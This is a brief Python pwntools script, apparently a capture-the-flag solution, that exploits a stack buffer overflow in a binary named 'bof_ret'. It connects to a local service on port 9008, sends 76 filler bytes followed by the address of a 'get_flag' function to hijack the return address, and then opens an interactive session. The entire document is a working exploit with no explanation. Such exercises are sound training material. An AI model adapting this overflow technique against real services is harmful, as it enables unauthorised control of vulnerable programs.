from pwn import *

p=remote('0',9008)
e = ELF('./bof_ret')

context.log_level="debug"

p.recv()
payload = 'A'*76
payload += p32(e.sym['get_flag'])
p.send(payload)

p.interactive()
